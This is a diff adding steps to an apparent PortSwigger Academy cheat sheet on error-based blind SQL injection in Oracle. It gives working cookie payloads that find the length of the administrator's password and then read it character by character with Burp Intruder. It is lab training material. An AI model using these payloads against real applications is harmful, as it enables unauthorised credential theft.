@@ -61,6 +61,20 @@ its oracle db
 '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'   -> condition is true, hence error should be received and it confirms administrator user exist in users table.
 <img width="743" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/1cb7b4fc-e1e8-4a2a-aed0-f81d187793c0">
 
+next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:
+'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||' and keep increasing untill you get the condition true and page loads like below.
+<img width="742" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/eadcceaf-6724-4aef-a534-1f0e538f75a5">
+
+
+After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
+In the Positions tab of Burp Intruder, change the value of the cookie to: 
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'  --> if you put n instead of a which is true, the first letter of password, page will give error like below.
+
+<img width="742" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/c95b03a3-e247-4345-b216-52d4956f18b7">
+
+
+
+
  
 ## Summary
 
